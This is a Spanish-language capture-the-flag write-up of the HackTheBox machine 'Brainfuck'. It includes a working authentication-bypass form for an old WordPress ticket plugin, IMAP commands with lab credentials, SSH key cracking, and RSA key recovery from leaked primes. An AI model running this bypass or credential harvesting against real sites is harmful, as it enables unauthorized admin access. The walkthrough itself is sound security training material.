---
title: "Brainfuck — INSANE"
date: 2026-04-13 12:00:00 -0700
categories: [Writeups, HTB]
tags: [HTB, brainfuck, wordpress, flarum, imap, smtp, ssh, john, rsa, vigenere]
image: /assets/img/brainfuck/Brainfuck-HTB.png
toc: true
comments: true
description: "Writeup técnico y paso a paso de 'Brainfuck' (HTB): enumeración de WordPress y subdominios vía TLS, abuso de WP Support Plus Responsive Ticket System, recuperación de credenciales SMTP, acceso al foro privado, obtención de llave SSH y escalada final mediante una implementación insegura de RSA."
---

# Brainfuck — INSANE

**Fecha:** 2026-04-13  
**IP objetivo:** `10.129.228.97`  
**Estado:** Resuelta  
**Autor:** Roberto

---

## TL;DR

La máquina expone SSH, servicios de correo y un sitio web HTTPS. El certificado TLS revela dos virtual hosts importantes: `brainfuck.htb` y `sup3rs3cr3t.brainfuck.htb`. En el primero encontramos un WordPress vulnerable; WPScan identifica el plugin **WP Support Plus Responsive Ticket System 7.1.3**, que permite autenticación indebida mediante la acción `loginGuestFacebook`. Aprovechando esa falla obtenemos acceso al panel administrativo.

Ya dentro, revisando la configuración de plugins, encontramos **Easy WP SMTP**, donde el sitio almacena credenciales del correo. Aunque la contraseña aparece oculta en la interfaz, sigue presente en el HTML, por lo que puede recuperarse fácilmente. Con esas credenciales accedemos al buzón por IMAP y encontramos un mensaje que revela las credenciales del foro secreto.

En el foro descubrimos información relacionada con el acceso SSH y recuperamos una clave privada protegida por passphrase. Convertimos la llave con `ssh2john.py`, crackeamos la passphrase con John the Ripper y accedemos como `orestis` por SSH. En su directorio encontramos un script `encrypt.sage` y archivos auxiliares que muestran que el contenido de `root.txt` fue cifrado con RSA, pero además exponen `p`, `q` y `e` en `debug.txt`. Con esos valores reconstruimos la clave privada RSA, desciframos el ciphertext y obtenemos la flag de root.

---

## Reconocimiento

Comenzamos con un escaneo completo de puertos para identificar la superficie de ataque:

```bash
nmap -p- -Pn 10.129.228.97 -sCV --min-rate 5000 -oN enum.txt
```

```bash
┌─ /workspace/hackthebox/Brainfuck
└─ ➤ nmap -p- -Pn 10.129.228.97 -sCV --min-rate 5000 -oN enum.txt

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 94d0b334e9a537c5acb980df2a54a5f0 (RSA)
|   256 6bd5dc153a667af419915d7385b24cb2 (ECDSA)
|_  256 23f5a333339d76d5f2ea6971e34e8e02 (ED25519)
25/tcp  open  smtp?
|_smtp-commands: Couldn't establish connection on port 25
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: RESP-CODES USER UIDL CAPA SASL(PLAIN) PIPELINING TOP AUTH-RESP-CODE
143/tcp open  imap     Dovecot imapd
|_imap-capabilities: IMAP4rev1 more ID have post-login LITERAL+ listed ENABLE capabilities LOGIN-REFERRALS SASL-IR AUTH=PLAINA0001 Pre-login IDLE OK
443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg:
|_  http/1.1
| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
| Not valid before: 2017-04-13T11:19:29
|_Not valid after:  2027-04-11T11:19:29
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.10.0 (Ubuntu)
| tls-alpn:
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

A simple vista, hay varias cosas importantes:

- `22/tcp`: acceso SSH, probablemente útil más adelante.
- `25/tcp`, `110/tcp` y `143/tcp`: servicios de correo expuestos.
- `443/tcp`: superficie web principal.
- El certificado TLS revela dos nombres importantes que no conviene ignorar:
  - `brainfuck.htb`
  - `sup3rs3cr3t.brainfuck.htb`

Ese último punto fue clave. En muchas máquinas, el certificado TLS ya adelanta subdominios internos o virtual hosts reales de la superficie de ataque. Así que agregamos ambos al archivo `/etc/hosts`:

```bash
10.129.228.97 brainfuck.htb www.brainfuck.htb sup3rs3cr3t.brainfuck.htb
```

---

## Enumeración web

Con los hosts configurados, usamos `whatweb` para identificar mejor las tecnologías utilizadas:

```bash
┌─ /workspace/hackthebox/Brainfuck
└─ ➤ whatweb https://brainfuck.htb/
https://brainfuck.htb/ [200 OK] Bootstrap[4.7.3], Country[RESERVED][ZZ], Email[ajax-loader@2x.gif,orestis@brainfuck.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.10.0 (Ubuntu)], IP[10.129.228.97], JQuery[1.12.4], MetaGenerator[WordPress 4.7.3], Modernizr, PoweredBy[WordPress,], Script[text/javascript], Title[Brainfuck Ltd. &#8211; Just another WordPress site], UncommonHeaders[link], WordPress[4.7.3], nginx[1.10.0]

┌─ /workspace/hackthebox/Brainfuck
└─ ➤ whatweb https://sup3rs3cr3t.brainfuck.htb/
https://sup3rs3cr3t.brainfuck.htb/ [200 OK] Cookies[flarum_session], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.10.0 (Ubuntu)], HttpOnly[flarum_session], IP[10.129.228.97], Script, Title[Super Secret Forum], UncommonHeaders[x-csrf-token], nginx[1.10.0]
```

Esto separa claramente dos objetivos:

- `brainfuck.htb`: un sitio montado sobre **WordPress 4.7.3**
- `sup3rs3cr3t.brainfuck.htb`: un **foro Flarum**

La página principal se veía así:

![Página principal de WordPress](/assets/img/brainfuck/PrincipalWordpress.png)

Y el subdominio secreto correspondía al foro:

![Página principal del foro](/assets/img/brainfuck/PrincipalForum.png)

En este punto creé una cuenta en el foro para revisar contenido, pero no encontré una vía de explotación clara desde usuario normal. Por eso decidí concentrarme primero en WordPress.

---

## Enumeración de WordPress

El siguiente paso lógico fue usar `wpscan`:

```bash
wpscan --url https://brainfuck.htb/ --disable-tls-checks --api-token <TOKEN>
```

La herramienta reportó muchas vulnerabilidades asociadas a WordPress 4.7.3. Eso suele pasar con versiones antiguas: aparecen decenas de hallazgos potenciales, pero no todos sirven para resolver la máquina. Lo importante aquí era identificar una ruta explotable y concreta.

El hallazgo clave fue este plugin:

```text
WP Support Plus Responsive Ticket System < 8.0.0 - Privilege Escalation
Version: 7.1.3
```

Y además existía un PoC público:

```text
https://www.exploit-db.com/exploits/41006
```

El PoC original era el siguiente:

```html
<form method="post" action="http://wp/wp-admin/admin-ajax.php">
	Username: <input type="text" name="username" value="administrator">
	<input type="hidden" name="email" value="sth">
	<input type="hidden" name="action" value="loginGuestFacebook">
	<input type="submit" value="Login">
</form>
```

---

## Explotación inicial

### Qué falla aquí

La vulnerabilidad está en la acción `loginGuestFacebook`. El plugin implementa una lógica de inicio de sesión que confía en parámetros controlados por el cliente sin validar correctamente que el usuario haya pasado por un flujo real de autenticación.

Dicho de manera simple: la aplicación acepta datos como `username`, `email` y `action`, y termina generando una sesión autenticada. Eso rompe completamente el modelo de seguridad del login, porque permite suplantar a otro usuario. Si el usuario suplantado tiene privilegios altos, el impacto se convierte en acceso directo como administrador.

### Explotación práctica

Creamos un HTML local adaptando el PoC al objetivo:

```bash
cat > /workspace/hackthebox/Brainfuck/exploit.html << 'EOF'
<form method="post" action="https://brainfuck.htb/wp-admin/admin-ajax.php">
    Username: <input type="text" name="username" value="admin">
    <input type="hidden" name="email" value="orestis@brainfuck.htb">
    <input type="hidden" name="action" value="loginGuestFacebook">
    <input type="submit" value="Login">
</form>
EOF
```

Levantamos un servidor local:

```bash
cd /workspace/hackthebox/Brainfuck && python3 -m http.server 8000
```

Y abrimos en el navegador:

```text
http://localhost:8000/exploit.html
```

Después de enviar el formulario, las cookies de sesión quedan almacenadas en el navegador. Luego solo visitamos:

```text
https://brainfuck.htb/wp-admin/
```

Y aparecemos autenticados en el panel.

![Cookies de sesión tras el bypass](/assets/img/brainfuck/Cookies.png)

![Panel de administración de WordPress](/assets/img/brainfuck/PanelWordpress.png)

Con eso conseguimos acceso administrativo sobre WordPress.

---

## Descubrimiento de credenciales SMTP

Con acceso al panel, el siguiente paso fue revisar plugins, configuraciones y cualquier información sensible almacenada por la aplicación. Ahí apareció un plugin muy interesante: **Easy WP SMTP**.

Esto tenía sentido por dos razones:

1. En el escaneo inicial ya habíamos visto servicios de correo expuestos.
2. Si el sitio usa SMTP para enviar correos, existe una buena posibilidad de que las credenciales estén almacenadas en WordPress.

Dentro de la configuración encontramos el usuario SMTP y una contraseña aparentemente oculta.

![Plugin Easy WP SMTP en WordPress](/assets/img/brainfuck/Plugin.png)

![Datos configurados en Easy WP SMTP](/assets/img/brainfuck/DatosPlugin.png)

Sin embargo, ocultar una contraseña en un campo HTML no equivale a protegerla. Si el valor sigue estando presente en el DOM o en el código fuente entregado al navegador, cualquier persona con acceso a la página puede recuperarlo.

Al inspeccionar el HTML con `CTRL + U`, pudimos verla sin problema:

![Contraseña visible en el código fuente](/assets/img/brainfuck/CodigoFuente.png)

### Explicación de la debilidad

Aquí no estamos explotando una vulnerabilidad separada del plugin, sino una mala práctica de seguridad bastante seria: **exponer secretos al cliente**. Aunque el campo se vea como `password`, el navegador ya recibió el valor real. Eso significa que cualquier persona con acceso al panel puede obtener credenciales reutilizables en otros servicios.

Y justo eso ocurre en esta máquina.

---

## Acceso al correo

Con las credenciales del correo, la idea fue revisar el buzón para buscar información útil. Aquí hay una precisión técnica importante: aunque inicialmente uno piense en SMTP, los comandos que usamos para listar carpetas y leer mensajes son realmente de **IMAP**.

- **SMTP** sirve para enviar correos.
- **IMAP** sirve para listar buzones y leer mensajes.

Como el puerto `143/tcp` estaba abierto y Nmap identificó Dovecot IMAP, tenía sentido usar ese protocolo.

Los comandos fueron:

```text
a1 LOGIN orestis kHGuERB29DNiNE
a2 LIST "" "*"
a3 EXAMINE INBOX
a4 FETCH 1 BODY[]
a5 FETCH 2 BODY[]
```

El mensaje importante reveló esto:

```text
Hi there, your credentials for our "secret" forum are below :)

username: orestis
password: kIEnnfEKJ#9UmdO
```

Con eso ya teníamos credenciales válidas para el foro privado.

---

## Acceso al foro privado

Usamos esas credenciales para iniciar sesión en `sup3rs3cr3t.brainfuck.htb`:

![Acceso al foro privado](/assets/img/brainfuck/Foros.png)

Al revisar el contenido, especialmente en la sección relacionada con acceso SSH, apareció una pista importante: el inicio de sesión por contraseña estaba deshabilitado y solo se permitía autenticación mediante llave.

![SSH sin autenticación por contraseña](/assets/img/brainfuck/Nopassword.png)

Eso cambia por completo el enfoque. Ya no se trata de conseguir una contraseña SSH, sino de recuperar una **private key** válida y, si está protegida, su passphrase.

En el foro había suficiente información para llegar a una llave privada cifrada. Además, apareció texto que se prestaba a ser interpretado como un mensaje cifrado con **Vigenère**, o al menos como una transformación compatible con un descifrador de ese tipo.

Para apoyar esa parte utilicé esta herramienta:

```text
https://www.dcode.fr/cifrado-vigenere
```

![Proceso de descifrado con Vigenère](/assets/img/brainfuck/Decifrado.png)

Después de procesar la información del foro, recuperamos la llave privada SSH, aunque protegida con passphrase.

---

## Crackeo de la passphrase de la llave SSH

Con la private key en nuestro poder, la convertimos a un formato crackeable para John the Ripper:

```bash
┌─ /workspace/tools
└─ ➤ ssh2john.py /workspace/hackthebox/Brainfuck/id_rsa > id_john
```

Luego ejecutamos John con `rockyou.txt`:

```bash
┌─ /workspace/tools
└─ ➤ john id_john --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [MD5/bcrypt-pbkdf/[3]DES/AES 32/64])
Cost 1 (KDF/cipher [0:MD5/AES 1:MD5/[3]DES 2:bcrypt-pbkdf/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
3poulakia!       (/workspace/hackthebox/Brainfuck/id_rsa)
1g 0:00:00:04 DONE (2026-04-13 22:57) 0.2273g/s 2832Kp/s 2832Kc/s 2832KC/s 3puledega..3poopsie16
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

La passphrase era:

```text
3poulakia!
```

Con eso ya podemos entrar por SSH:

```bash
┌─ /workspace/hackthebox/Brainfuck
└─ ➤ ssh -i id_rsa orestis@brainfuck.htb

Enter passphrase for key 'id_rsa': 3poulakia!
```

Y obtenemos acceso como `orestis`.

```bash
orestis@brainfuck:~$ cat user.txt
2c11cfbc5b959f73ac15a3310bd097c9
```

---

## Enumeración local

Una vez dentro, listamos el contenido del directorio personal:

```bash
orestis@brainfuck:~$ ls
debug.txt  encrypt.sage  mail  output.txt  user.txt
```

Lo interesante aquí no es solo encontrar archivos raros, sino entender qué papel cumple cada uno:

- `output.txt` contiene un valor cifrado.
- `debug.txt` contiene tres enteros gigantes.
- `encrypt.sage` parece ser el script que generó ese cifrado.

`output.txt` mostraba esto:

```bash
orestis@brainfuck:~$ cat output.txt
Encrypted Password: 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182
```

`debug.txt` contenía lo siguiente:

```bash
orestis@brainfuck:~$ cat debug.txt
7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
```

Y el script `encrypt.sage` explicaba el proceso:

```bash
orestis@brainfuck:~$ cat encrypt.sage
nbits = 1024

password = open("/root/root.txt").read().strip()
enc_pass = open("output.txt","w")
debug = open("debug.txt","w")
m = Integer(int(password.encode('hex'),16))

p = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
q = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
n = p*q
phi = (p-1)*(q-1)
e = ZZ.random_element(phi)
while gcd(e, phi) != 1:
    e = ZZ.random_element(phi)

c = pow(m, e, n)
enc_pass.write('Encrypted Password: '+str(c)+'\n')
debug.write(str(p)+'\n')
debug.write(str(q)+'\n')
debug.write(str(e)+'\n')
```

---

## Escalada de privilegios

### Qué hace el script

El script toma el contenido de `/root/root.txt`, lo convierte a un entero y lo cifra usando RSA. El flujo general es este:

1. Genera dos primos aleatorios `p` y `q`.
2. Calcula `n = p * q`.
3. Calcula `phi = (p - 1) * (q - 1)`.
4. Escoge un exponente público `e` coprimo con `phi`.
5. Cifra el mensaje mediante `c = m^e mod n`.

Hasta ahí, la lógica general es consistente con RSA.

### Dónde está el error crítico

El problema real es que el script escribe en `debug.txt` exactamente los valores que jamás deberían exponerse:

- `p`
- `q`
- `e`

En RSA, si un atacante conoce `p` y `q`, puede reconstruir toda la clave privada. Eso destruye por completo la seguridad del cifrado. El algoritmo no falla por una debilidad matemática del esquema, sino por una **mala gestión de secretos**.

### Idea del ataque

Recordemos:

- Cifrado: `c = m^e mod n`
- Descifrado: `m = c^d mod n`

Donde `d` es el inverso modular de `e` respecto a `phi(n)`.

Como `debug.txt` nos da directamente `p`, `q` y `e`, podemos:

1. Reconstruir `n = p * q`
2. Calcular `phi = (p - 1) * (q - 1)`
3. Obtener `d = e^(-1) mod phi`
4. Descifrar el ciphertext
5. Convertir el entero resultante a texto

---

## Descifrado del ciphertext

Usé este script en Python:

```python
# Algoritmo extendido de Euclides para calcular el inverso modular
def egcd(a, b):
    if a == 0:
        return b, 0, 1
    g, x, y = egcd(b % a, a)
    return g, y - (b // a) * x, x

# Valores extraídos de debug.txt y output.txt
p = 7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
q = 7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
e = 30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
c = 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182

# Reconstrucción de parámetros RSA
n = p * q
phi = (p - 1) * (q - 1)

# Cálculo de la clave privada d
_, d, _ = egcd(e % phi, phi)
d = d % phi

# Descifrado
m = pow(c, d, n)

# Conversión del entero a texto
print(bytes.fromhex(hex(m)[2:]).decode())
```

Y con eso recuperamos el contenido original de `root.txt`.

---

## Resumen

La máquina Brainfuck muestra una cadena de compromiso bastante interesante porque obliga a enlazar varias debilidades distintas en lugar de depender de una sola explotación aislada. El acceso inicial nace del reconocimiento cuidadoso: el certificado TLS revela un subdominio adicional y la enumeración del WordPress identifica un plugin vulnerable que permite autenticación indebida. Esa primera falla no da shell directamente, pero sí acceso al panel administrativo, lo que abre la puerta a secretos más sensibles.

Ya dentro del backend, el siguiente error es de gestión de credenciales. El plugin de SMTP almacena la contraseña de correo de forma recuperable desde el HTML, lo que permite reutilizar esas credenciales en el servicio IMAP expuesto por el host. A través del buzón obtenemos acceso al foro privado, y desde ahí se filtra la información suficiente para recuperar una clave SSH y crackear su passphrase.

La escalada final es la parte más llamativa: no se basa en un binario SUID clásico ni en una mala configuración de `sudo`, sino en una implementación insegura de RSA. El script `encrypt.sage` cifra el contenido de `root.txt`, pero además deja en `debug.txt` los valores `p`, `q` y `e`, que son suficientes para reconstruir la clave privada y revertir el cifrado. Es un buen ejemplo de cómo una idea criptográfica correcta puede quedar completamente anulada por un manejo desastroso del material secreto.

En conjunto, la máquina deja varias lecciones claras: los certificados TLS pueden revelar parte de la superficie real, un panel administrativo comprometido suele implicar exposición de más secretos, ocultar una contraseña en el navegador no la protege, y en criptografía la seguridad depende tanto del algoritmo como de cómo se implementa y se resguardan sus parámetros internos.

Happy hacking :)

